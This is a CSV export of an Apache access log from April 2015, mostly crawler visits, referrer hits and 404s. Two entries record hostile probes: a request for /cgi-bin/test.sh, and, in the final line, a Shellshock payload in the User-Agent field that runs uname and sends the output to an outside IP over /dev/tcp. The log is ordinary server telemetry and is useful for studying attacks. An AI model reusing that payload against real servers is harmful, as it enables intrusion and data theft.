"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"127.0.0.1","-","2015-04-05 06:32:59","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-04-05 06:32:59","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-04-05 06:32:59","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-04-05 06:32:59","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"66.249.65.187","-","2015-04-05 06:52:35","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"146.148.66.27","-","2015-04-05 06:55:03","GMT-0700","GET","/",200,600,"-","NerdyBot"
"123.30.175.211","-","2015-04-05 07:29:27","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
"192.187.114.42","-","2015-04-05 07:37:51","GMT-0700","GET","/ramble/index.php?blogid=49",404,495,"http://spinster.org/ramble/index.php?blogid=49","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36"
"192.187.114.42","-","2015-04-05 07:37:51","GMT-0700","GET","/",200,562,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36"
"46.28.68.135","-","2015-04-05 08:02:06","GMT-0700","GET","/ramble/index.php?blogId=12",404,495,"http://spinster.org/ramble/index.php?blogId=12","Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0"
"46.28.68.135","-","2015-04-05 08:02:07","GMT-0700","GET","/",200,562,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0"
"104.154.74.192","-","2015-04-05 08:15:03","GMT-0700","GET","/",200,600,"-","NerdyBot"
"119.63.196.103","-","2015-04-05 08:53:13","GMT-0700","GET","/",200,562,"-","Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
"46.7.55.214","-","2015-04-05 11:03:44","GMT-0700","GET","/",200,565,"-","Screaming Frog SEO Spider/3.3"
"52.5.101.207","-","2015-04-05 12:44:34","GMT-0700","GET","/favicon.ico",404,532,"-","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
"52.5.68.82","-","2015-04-05 12:47:34","GMT-0700","GET","/favicon.ico",404,532,"-","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
"121.41.111.107","-","2015-04-05 13:52:31","GMT-0700","GET","/cgi-bin/test.sh",404,536,"-","the beast"
"46.28.68.135","-","2015-04-05 15:39:16","GMT-0700","GET","/ramble/index.php?blogId=12",404,495,"http://spinster.org/ramble/index.php?blogId=12","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0"
"46.28.68.135","-","2015-04-05 15:39:17","GMT-0700","GET","/",200,562,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0"
"46.28.206.148","-","2015-04-05 16:32:57","GMT-0700","GET","/",400,514,"-","() { :;}; echo; /bin/uname -a > /dev/tcp/45.55.157.194/80;"
